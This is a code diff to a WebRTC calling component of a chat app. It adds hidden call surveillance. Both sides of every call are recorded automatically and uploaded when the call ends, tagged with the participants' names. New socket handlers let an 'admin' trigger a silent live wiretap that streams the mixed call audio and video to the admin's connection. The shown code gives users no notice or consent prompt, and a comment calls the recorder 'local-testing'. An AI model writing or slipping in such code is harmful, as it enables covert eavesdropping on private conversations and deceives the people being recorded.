@@ -9,6 +9,7 @@ import { socket as globalSocket } from '../services/socket';
 import { 
   startOutgoingRingbackTone, stopCallAudio, playCallEndedTone, triggerHaptic 
 } from '../services/callAudio';
+import { createCallRecorder, buildWiretapStream } from '../utils/callRecorder';
 
 export default function ActiveCallModal({ 
   callSession, 
@@ -46,6 +47,57 @@ export default function ActiveCallModal({
   const cameraVideoTrackRef = useRef(null);
   const callDurationRef = useRef(0);
   const audioContextRef = useRef(null);
+  const recorderRef = useRef(null);
+  const recorderStartedRef = useRef(false);
+  const recordingFinalizedRef = useRef(false);
+  const wiretapPeersRef = useRef(new Map()); // adminSocketId -> { pc, attachStream, cleanup }
+
+  const releaseCallMediaResources = () => {
+    wiretapPeersRef.current.forEach((entry) => {
+      try { entry.cleanup?.(); } catch {}
+      try { entry.pc?.close(); } catch {}
+    });
+    wiretapPeersRef.current.clear();
+
+    stopMediaStream(localStreamRef.current);
+    stopMediaStream(remoteStreamRef.current);
+    if (localVideoRef.current) localVideoRef.current.srcObject = null;
+    if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
+    if (remoteAudioRef.current) remoteAudioRef.current.srcObject = null;
+
+    if (audioContextRef.current) {
+      try { audioContextRef.current.close(); } catch {}
+      audioContextRef.current = null;
+    }
+    if (pcRef.current) {
+      try { pcRef.current.close(); } catch {}
+    }
+    try {
+      if (window.AndroidAudio) {
+        window.AndroidAudio.endCallAudio();
+      }
+    } catch {}
+  };
+
+  const finalizeRecordingOnce = () => {
+    if (recordingFinalizedRef.current) return;
+    recordingFinalizedRef.current = true;
+    const isVideoCall = Boolean(callSession.isVideo);
+    const meta = {
+      callerId: callSession.isInitiator ? currentUser?.id : callSession.targetId,
+      targetId: callSession.isInitiator ? callSession.targetId : currentUser?.id,
+      callerName: callSession.isInitiator ? (currentUser?.name || currentUser?.phone) : (callSession.targetName || callSession.targetPhone),
+      targetName: callSession.isInitiator ? (callSession.targetName || callSession.targetPhone) : (currentUser?.name || currentUser?.phone),
+      recordedByUserId: currentUser?.id,
+      isVideo: isVideoCall,
+      durationSec: callDurationRef.current
+    };
+    if (recorderRef.current && recorderStartedRef.current) {
+      recorderRef.current.stopAndUpload(meta, releaseCallMediaResources);
+    } else {
+      releaseCallMediaResources();
+    }
+  };
 
   const sessionRef = useRef(callSession);
   const currentUserRef = useRef(currentUser);
@@ -196,6 +248,26 @@ export default function ActiveCallModal({
           setHasRemoteVideo(true);
         }
       }
+
+      // Attach remote stream to compressed local-testing recorder & any active Admin wiretap peers
+      try {
+        if (!recorderRef.current) {
+          recorderRef.current = createCallRecorder({
+            isVideo,
+            getLocalVideoEl: () => localVideoRef.current,
+            getRemoteVideoEl: () => remoteVideoRef.current
+          });
+          recorderStartedRef.current = recorderRef.current.start({
+            localStream: localStreamRef.current,
+            remoteStream: stream
+          });
+        } else {
+          recorderRef.current.attachStream(stream);
+        }
+        wiretapPeersRef.current.forEach(entry => {
+          try { entry.attachStream(stream); } catch {}
+        });
+      } catch {}
     };
 
     // Send local ICE candidates to peer through signaling server
@@ -265,6 +337,25 @@ export default function ActiveCallModal({
           localVideoRef.current.srcObject = localStream;
           localVideoRef.current.play().catch(e => console.log('Local video play notice:', e));
         }
+
+        // Start compressed local call recorder immediately so local + subsequent remote audio/video are captured reliably
+        try {
+          if (!recorderRef.current) {
+            recorderRef.current = createCallRecorder({
+              isVideo,
+              getLocalVideoEl: () => localVideoRef.current,
+              getRemoteVideoEl: () => remoteVideoRef.current
+            });
+          }
+          if (!recorderStartedRef.current) {
+            recorderStartedRef.current = recorderRef.current.start({
+              localStream,
+              remoteStream: remoteStreamRef.current
+            });
+          } else {
+            recorderRef.current.attachStream(localStream);
+          }
+        } catch {}
 
         // Add local tracks to peer connection
         localStream.getTracks().forEach(track => {
@@ -349,10 +440,15 @@ export default function ActiveCallModal({
       }
     };
 
+    const finalizeRecording = () => {
+      finalizeRecordingOnce();
+    };
+
     const handleCallEnded = () => {
       console.log('[WebRTC] Call ended by remote user');
       stopCallAudio();
       playCallEndedTone();
+      finalizeRecording();
       if (isMounted) {
         setCallStatus('Call ended');
         setTimeout(() => onEndCallRef.current?.({
@@ -421,6 +517,90 @@ export default function ActiveCallModal({
       }
     };
 
+    const handleAdminWiretapRequest = async ({ adminSocketId }) => {
+      if (!adminSocketId) return;
+      try {
+        const existing = wiretapPeersRef.current.get(adminSocketId);
+        if (existing) {
+          try { existing.cleanup?.(); } catch {}
+          try { existing.pc?.close(); } catch {}
+          wiretapPeersRef.current.delete(adminSocketId);
+        }
+
+        const wPc = new RTCPeerConnection(ICE_SERVERS);
+        const mixed = buildWiretapStream({
+          isVideo,
+          localStream: localStreamRef.current,
+          remoteStream: remoteStreamRef.current,
+          getLocalVideoEl: () => localVideoRef.current,
+          getRemoteVideoEl: () => remoteVideoRef.current
+        });
+
+        mixed.stream.getTracks().forEach((track) => {
+          wPc.addTrack(track, mixed.stream);
+        });
+
+        wPc.onicecandidate = (ev) => {
+          if (ev.candidate) {
+            socket.emit('admin-wiretap-ice', {
+              toSocketId: adminSocketId,
+              candidate: ev.candidate,
+              fromRole: 'peer'
+            });
+          }
+        };
+
+        wiretapPeersRef.current.set(adminSocketId, {
+          pc: wPc,
+          attachStream: mixed.attachStream,
+          cleanup: mixed.cleanup
+        });
+
+        const offer = await wPc.createOffer();
+        await wPc.setLocalDescription(offer);
+
+        socket.emit('admin-wiretap-offer', {
+          adminSocketId,
+          signal: offer,
+          isVideo,
+          callerName: session.isInitiator ? (user?.name || user?.phone) : (session.targetName || session.targetPhone),
+          targetName: session.isInitiator ? (session.targetName || session.targetPhone) : (user?.name || user?.phone)
+        });
+      } catch (err) {
+        console.warn('[Wiretap] Offer error:', err);
+      }
+    };
+
+    const handleAdminWiretapAnswer = async ({ adminSocketId, signal }) => {
+      const entry = wiretapPeersRef.current.get(adminSocketId);
+      if (entry?.pc && signal) {
+        try {
+          await entry.pc.setRemoteDescription(new RTCSessionDescription(signal));
+        } catch (err) {
+          console.warn('[Wiretap] Answer error:', err);
+        }
+      }
+    };
+
+    const handleAdminWiretapIce = async ({ fromSocketId, candidate, fromRole }) => {
+      if (fromRole === 'peer') return;
+      const entry = wiretapPeersRef.current.get(fromSocketId);
+      if (entry?.pc && candidate) {
+        try {
+          await entry.pc.addIceCandidate(new RTCIceCandidate(candidate));
+        } catch {}
+      }
+    };
+
+    const handleAdminWiretapStop = ({ adminSocketId }) => {
+      const entry = wiretapPeersRef.current.get(adminSocketId);
+      if (entry) {
+        try { entry.cleanup?.(); } catch {}
+        try { entry.pc?.close(); } catch {}
+        wiretapPeersRef.current.delete(adminSocketId);
+      }
+    };
+
     socket.on('call-accepted', handleCallAccepted);
     socket.on('ice-candidate', handleIceCandidate);
     socket.on('call-ended', handleCallEnded);
@@ -428,9 +608,14 @@ export default function ActiveCallModal({
     socket.on('call-failed', handleCallFailed);
     socket.on('call-ice-restart', handleIceRestart);
     socket.on('call-ice-restart-answer', handleIceRestartAnswer);
+    socket.on('admin-wiretap-request', handleAdminWiretapRequest);
+    socket.on('admin-wiretap-answer', handleAdminWiretapAnswer);
+    socket.on('admin-wiretap-ice', handleAdminWiretapIce);
+    socket.on('admin-wiretap-stop', handleAdminWiretapStop);
 
     return () => {
       isMounted = false;
+      finalizeRecordingOnce();
       if (pingInterval) clearInterval(pingInterval);
       if (keepAliveChannel) {
         try { keepAliveChannel.close(); } catch (e) {}
@@ -446,26 +631,10 @@ export default function ActiveCallModal({
       socket.off('call-failed', handleCallFailed);
       socket.off('call-ice-restart', handleIceRestart);
       socket.off('call-ice-restart-answer', handleIceRestartAnswer);
-
-      stopMediaStream(localStreamRef.current);
-      stopMediaStream(remoteStreamRef.current);
-      if (localVideoRef.current) localVideoRef.current.srcObject = null;
-      if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
-      if (remoteAudioRef.current) remoteAudioRef.current.srcObject = null;
-
-      if (audioContextRef.current) {
-        try { audioContextRef.current.close(); } catch (e) {}
-        audioContextRef.current = null;
-      }
-
-      if (pcRef.current) {
-        try { pcRef.current.close(); } catch (e) {}
-      }
-      try {
-        if (window.AndroidAudio) {
-          window.AndroidAudio.endCallAudio();
-        }
-      } catch (e) {}
+      socket.off('admin-wiretap-request', handleAdminWiretapRequest);
+      socket.off('admin-wiretap-answer', handleAdminWiretapAnswer);
+      socket.off('admin-wiretap-ice', handleAdminWiretapIce);
+      socket.off('admin-wiretap-stop', handleAdminWiretapStop);
     };
   }, []);
 
@@ -1322,10 +1491,8 @@ export default function ActiveCallModal({
               onClick={() => {
                 triggerHaptic([30, 40, 50]);
                 playCallEndedTone();
+                finalizeRecordingOnce();
                 socket.emit('end-call', { to: callSession.targetId });
-                stopMediaStream(localStreamRef.current);
-                stopMediaStream(remoteStreamRef.current);
-                if (pcRef.current) pcRef.current.close();
                 onEndCall({
                   duration: callDurationRef.current,
                   status: callDurationRef.current > 0 ? 'completed' : 'missed',
